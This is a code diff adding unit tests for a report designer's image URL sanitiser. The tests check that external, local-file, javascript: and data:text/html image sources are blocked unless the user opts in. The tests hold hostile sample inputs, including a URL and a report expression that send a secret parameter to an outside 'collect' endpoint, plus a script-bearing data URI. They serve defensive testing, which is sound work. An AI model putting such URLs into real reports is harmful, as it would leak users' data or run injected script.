@@ -4,7 +4,7 @@ import { DOMParser, XMLSerializer } from '@xmldom/xmldom';
 import { XmlDom, parseRdl, serializeRdl } from '../webview/rdl';
 import { ImageItem, emptyReport } from '../webview/model';
 import { createItem } from '../webview/ops';
-import { addEmbeddedImage, deleteEmbeddedImage, embeddedImages, imageUses, renameEmbeddedImage } from '../webview/images';
+import { addEmbeddedImage, deleteEmbeddedImage, embeddedImages, imageUses, renameEmbeddedImage, safeImageUrl } from '../webview/images';
 import { renderReport } from '../webview/render/engine';
 import { RImage } from '../webview/render/types';
 
@@ -13,6 +13,32 @@ const dom: XmlDom = {
   serialize: node => new XMLSerializer().serializeToString(node as never),
 };
 const PNG = 'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAYAAAAfFcSJAAAADUlEQVR42mNk+M9QDwADhgGAWjR9awAAAABJRU5ErkJggg==';
+
+test('Report images cannot request local files, HTTP endpoints or remote data without user opt-in', () => {
+  for (const url of ['https://example.invalid/collect?secret=123', 'http://127.0.0.1:18743/collect', 'file://server/share/picture.png', 'file:///C:/secret.png', '//server/share/picture.png', 'javascript:alert(1)', 'data:text/html;base64,PHNjcmlwdD4=']) {
+    assert.equal(safeImageUrl(url), '', url);
+    if (!url.startsWith('https:')) assert.equal(safeImageUrl(url, true), '', url);
+  }
+  assert.equal(safeImageUrl('https://example.invalid/image.png', true), 'https://example.invalid/image.png');
+  assert.equal(safeImageUrl('https://user:pass@example.invalid/image.png', true), '');
+  assert.equal(safeImageUrl(`data:image/png;base64,${PNG}`), `data:image/png;base64,${PNG}`);
+});
+
+test('External and Database image expressions obey the same restrictions as embedded images', () => {
+  const r = emptyReport();
+  const img = createItem(r, 'image', { left: 0, top: 0, width: 1, height: 1 }) as ImageItem;
+  r.body.items.push(img);
+  const render = (allowExternalImages = false) => (renderReport(serializeRdl(r, dom), { dom, mode: 'preview', allowExternalImages }).body.nodes[0] as RImage).src;
+  Object.assign(img, { source: 'External', value: '="https://example.invalid/collect?secret=" & Parameters!Secret.Value' });
+  assert.equal((renderReport(serializeRdl(r, dom), { dom, mode: 'preview', parameters: { Secret: 'SYNTHETIC' } }).body.nodes[0] as RImage).src, '');
+  img.value = 'file://server/share/image.png';
+  assert.equal(render(true), '');
+  img.value = 'https://example.invalid/image.png';
+  assert.equal(render(), '');
+  assert.equal(render(true), img.value);
+  Object.assign(img, { source: 'Database', value: 'data:text/html;base64,PHNjcmlwdD4=' });
+  assert.equal(render(true), '');
+});
 
 test('Eingebettete Bilder: hinzufügen, verwenden, umbenennen, löschen', () => {
   const r = emptyReport();
